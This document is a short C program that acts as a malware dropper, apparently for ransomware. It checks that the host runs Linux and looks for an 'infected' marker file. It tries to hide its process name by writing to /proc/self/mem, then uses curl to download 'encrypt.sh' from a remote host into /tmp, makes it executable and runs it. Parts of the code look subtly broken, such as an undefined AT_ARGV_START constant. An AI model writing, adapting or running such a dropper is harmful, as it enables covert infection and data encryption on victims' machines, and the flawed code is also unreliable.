#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <errno.h>
#include <sys/wait.h>
#include <fcntl.h>

// Function to check if a file exists
int check_infected(const char *filename) {
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

// Function to hide the process
void hide_process() {
    // Open the process's argv memory area
    int memfd = open("/proc/self/mem", O_RDWR);
    if (memfd == -1) {
        perror("open");
        exit(1);
    }

    // Write zeros to the argv memory area to hide the process name
    if (lseek(memfd, getauxval(AT_ARGV_START), SEEK_SET) == -1) {
        perror("lseek");
        close(memfd);
        exit(1);
    }

    char zero[1024] = {0};
    if (write(memfd, zero, sizeof(zero)) == -1) {
        perror("write");
        close(memfd);
        exit(1);
    }

    close(memfd);
}

int main(void) {
    // Detects host OS
    struct utsname buffer;
    if (uname(&buffer) != 0) {
        perror("uname");
        return 1;
    }

    // Check if the system is Linux
    if (strcmp(buffer.sysname, "Linux") != 0) {
        return 1;
    }

    // Check if the file is already on the system
    if (check_infected("/tmp/ghost_shell.c")) {
        return 1;
    }

    // Hide the process
    hide_process();

    // Creates child process
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        if (chdir("/tmp") == -1) {
            perror("chdir");
            exit(1);
        }
        // Execute a command in the child process to download the script
        execlp("curl", "curl", "http://example.com/encrypt.sh", "-o", "/tmp/encrypt.sh", NULL);
        perror("exec");
        exit(1);
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0); // Wait for the child process to complete
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            // Child process completed successfully
        } else {
            return 1;
        }
    } else {
        perror("fork");
        exit(1);
    }

    // Make the downloaded script executable and run it
    char *command = malloc(100 * sizeof(char));
    if (command == NULL) {
        perror("malloc");
        return 1;
    }
    strcpy(command, "chmod +x /tmp/encrypt.sh && /tmp/encrypt.sh");
    system(command);
    free(command);

    return 0;
}
